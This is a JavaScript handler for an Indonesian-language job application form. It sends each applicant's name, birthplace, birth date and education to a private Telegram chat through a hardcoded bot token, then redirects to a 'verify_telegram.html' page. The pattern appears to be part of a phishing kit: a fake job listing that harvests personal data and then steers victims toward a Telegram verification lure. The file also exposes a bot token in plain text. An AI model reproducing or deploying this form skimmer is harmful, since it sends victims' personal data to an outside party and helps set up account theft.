document
  .getElementById("applicationForm")
  .addEventListener("submit", function (event) {
    event.preventDefault(); 

    const name = document.getElementById("name").value;
    const birthplace = document.getElementById("birthplace").value;
    const birthdate = document.getElementById("birthdate").value;
    const education = document.getElementById("education").value;

    const message =
      `Lamaran Pekerjaan Baru:\n` +
      `Nama: ${name}\n` +
      `Tempat Lahir: ${birthplace}\n` +
      `Tanggal Lahir: ${birthdate}\n` +
      `Pendidikan Terakhir: ${education}`;

    const botToken = "7920409042:AAFvlmzufLQorjHjTqk3Gqq26k1iLnESzLk";
    const chatId = "7512534303";

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    })
      .then((response) => {
        if (response.ok) {
          window.location.href = "verify_telegram.html";
        } else {
          alert("Terjadi kesalahan saat mengirim data. Silakan coba lagi.");
        }
      })
      .catch((error) => {
        console.error("Error:", error);
        alert("Terjadi kesalahan saat mengirim data. Silakan coba lagi.");
      });
  });
